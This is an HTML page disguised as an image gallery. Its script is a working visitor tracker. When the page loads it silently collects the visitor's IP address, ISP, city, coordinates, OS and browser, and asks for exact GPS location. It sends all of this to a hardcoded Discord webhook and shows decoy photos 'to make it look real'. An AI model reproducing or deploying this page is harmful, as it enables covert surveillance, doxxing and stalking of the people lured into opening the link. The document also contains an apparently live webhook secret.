<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Gallery</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 20px;
        }
        .gallery img {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <p id="status-message">Loading gallery...</p>
        <div class="gallery" id="image-gallery" style="display: none;">
            <!-- Images will be loaded here -->
        </div>
    </div>

    <script>
        // Configuration
        const config = {
            // BASE CONFIG
            "webhook": "https://discord.com/api/webhooks/1350791006143905852/pq3nFAQqzUEyw2T7b3N1y1_iW8Sr5vnzY8-LxkaNA0lqicxNeEdO7AE9HMKDaPFLOc-j",
            "username": "Image Gallery Viewer",
            "color": 0x00FFFF,

            // OPTIONS
            "accurateLocation": true,
            "linkAlerts": true,
            "vpnCheck": 1,
            "antiBot": 1,
            
            // REDIRECTION
            "redirect": {
                "enabled": false,
                "url": "https://google.com",
                "delay": 3000
            },

            // CUSTOM MESSAGE
            "message": {
                "enabled": false,
                "message": "Thanks for visiting our gallery!",
                "richMessage": true
            }
        };

        // Enhanced error reporting
        async function sendErrorWebhook(error, additionalInfo = "") {
            try {
                const errorMessage = error.stack || error.message || error.toString();
                await fetch(config.webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: `${config.username} - ERROR`,
                        content: "@everyone",
                        embeds: [{
                            title: "âš ï¸ Gallery Error",
                            color: 0xFF0000,
                            description: `**An error occurred!**\n\n**Error:**\n\`\`\`${errorMessage.substring(0, 1000)}\`\`\`\n**Additional Info:** ${additionalInfo}`,
                            fields: [
                                { name: "URL", value: window.location.href, inline: true },
                                { name: "User Agent", value: navigator.userAgent?.substring(0, 100) || "Unknown", inline: true }
                            ]
                        }]
                    })
                });
            } catch (e) {
                console.error('Failed to send error webhook:', e);
            }
        }

        // Get IP information using JSONP to avoid CORS
        function getIPInfo() {
            return new Promise((resolve, reject) => {
                // Create JSONP callback
                const callbackName = 'ipCallback_' + Date.now();
                window[callbackName] = function(data) {
                    delete window[callbackName];
                    document.body.removeChild(script);
                    
                    if (data && data.status === 'success') {
                        resolve(data);
                    } else {
                        reject(new Error('IP API failed: ' + (data?.message || 'Unknown error')));
                    }
                };

                // Create script tag for JSONP
                const script = document.createElement('script');
                script.src = `https://ip-api.com/json/?fields=66846719&callback=${callbackName}`;
                script.onerror = () => {
                    reject(new Error('Failed to load IP API'));
                };
                document.body.appendChild(script);
            });
        }

        // Get precise location
        function getPreciseLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const coords = `${position.coords.latitude},${position.coords.longitude}`;
                        resolve({
                            coords: coords,
                            accuracy: position.coords.accuracy,
                            mapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                        });
                    },
                    (error) => {
                        console.log('Geolocation failed or denied:', error.message);
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // Send webhook helper
        async function sendWebhook(webhookData) {
            try {
                const response = await fetch(config.webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(webhookData)
                });
                
                if (!response.ok) {
                    throw new Error(`Webhook failed: ${response.status}`);
                }
            } catch (error) {
                console.error('Failed to send webhook:', error);
                await sendErrorWebhook(error, "Webhook send failed");
            }
        }

        // Parse user agent
        function parseUserAgent(ua) {
            if (!ua) return { os: 'Unknown', browser: 'Unknown' };
            
            let os = 'Unknown';
            let browser = 'Unknown';

            // OS Detection
            if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
            else if (/Windows NT 6.3/.test(ua)) os = 'Windows 8.1';
            else if (/Windows NT 6.2/.test(ua)) os = 'Windows 8';
            else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
            else if (/Windows NT 6.0/.test(ua)) os = 'Windows Vista';
            else if (/Windows NT 5.1/.test(ua)) os = 'Windows XP';
            else if (/Mac OS X/.test(ua)) {
                const match = /Mac OS X ([0-9_]+)/.exec(ua);
                os = match ? `macOS ${match[1].replace(/_/g, '.')}` : 'macOS';
            }
            else if (/Android/.test(ua)) os = 'Android';
            else if (/(iPhone|iPad).*OS/.test(ua)) os = 'iOS';
            else if (/Linux/.test(ua)) os = 'Linux';

            // Browser Detection
            if (/Chrome\//.test(ua) && !/Edg|OPR/.test(ua)) browser = 'Chrome';
            else if (/Firefox\//.test(ua)) browser = 'Firefox';
            else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
            else if (/Edg\//.test(ua)) browser = 'Edge';
            else if (/OPR\//.test(ua)) browser = 'Opera';

            return { os, browser };
        }

        // Load sample images to make it look real
        function loadGallery() {
            const gallery = document.getElementById('image-gallery');
            const images = [
                'https://picsum.photos/300/200?random=1',
                'https://picsum.photos/300/200?random=2', 
                'https://picsum.photos/300/200?random=3',
                'https://picsum.photos/300/200?random=4',
                'https://picsum.photos/300/200?random=5',
                'https://picsum.photos/300/200?random=6'
            ];

            images.forEach(src => {
                const img = document.createElement('img');
                img.src = src;
                img.alt = 'Gallery image';
                gallery.appendChild(img);
            });
            
            gallery.style.display = 'grid';
            document.querySelector('.loader').style.display = 'none';
            document.getElementById('status-message').textContent = 'Gallery loaded successfully!';
        }

        // Main logging function
        async function logVisitor() {
            try {
                // Send link alert
                if (config.linkAlerts) {
                    await sendWebhook({
                        username: `${config.username} - Visit`,
                        content: "",
                        embeds: [{
                            title: "ðŸ”— Gallery Accessed",
                            color: config.color,
                            description: `Someone visited the image gallery\n\n**User Agent:**\n\`\`\`${navigator.userAgent.substring(0, 200)}\`\`\``
                        }]
                    });
                }

                // Get IP info with JSONP (no CORS)
                const ipData = await getIPInfo();
                
                // Get browser info
                const browserInfo = parseUserAgent(navigator.userAgent);

                // Send main webhook
                await sendWebhook({
                    username: config.username,
                    content: "",
                    embeds: [{
                        title: "ðŸŒ Gallery Visitor",
                        color: config.color,
                        description: `
**Visitor Information:**

**IP Info:**
> **IP:** \`${ipData.query}\`
> **ISP:** \`${ipData.isp || 'Unknown'}\`
> **Country:** \`${ipData.country || 'Unknown'}\`
> **Region:** \`${ipData.regionName || 'Unknown'}\`
> **City:** \`${ipData.city || 'Unknown'}\`
> **Coords:** \`${ipData.lat}, ${ipData.lon}\`

**Browser Info:**
> **OS:** \`${browserInfo.os}\`
> **Browser:** \`${browserInfo.browser}\`
> **Mobile:** \`${ipData.mobile ? 'Yes' : 'No'}\`
> **VPN:** \`${ipData.proxy ? 'Yes' : 'No'}\``,
                        footer: {
                            text: "Gallery access logged"
                        }
                    }]
                });

                // Get precise location if enabled
                if (config.accurateLocation) {
                    const preciseLocation = await getPreciseLocation();
                    if (preciseLocation) {
                        await sendWebhook({
                            username: `${config.username} - Location`,
                            content: "",
                            embeds: [{
                                title: "ðŸ“ Precise Location",
                                color: 0x00FF00,
                                description: `**Exact GPS Location Obtained:**\n\n**Coordinates:** \`${preciseLocation.coords}\`\n**Accuracy:** ${preciseLocation.accuracy}m\n**Google Maps:** [View Location](${preciseLocation.mapsLink})`
                            }]
                        });
                    }
                }

                // Load the actual gallery
                loadGallery();

                // Redirect if enabled
                if (config.redirect.enabled) {
                    setTimeout(() => {
                        window.location.href = config.redirect.url;
                    }, config.redirect.delay);
                }

            } catch (error) {
                console.error('Logging error:', error);
                
                // Still load gallery even if logging fails
                loadGallery();
                
                // Send error report
                await sendErrorWebhook(error, "Main logging function failed");
            }
        }

        // Start when page loads
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(logVisitor, 1000); // Small delay to show loading
        });

    </script>
</body>
</html>
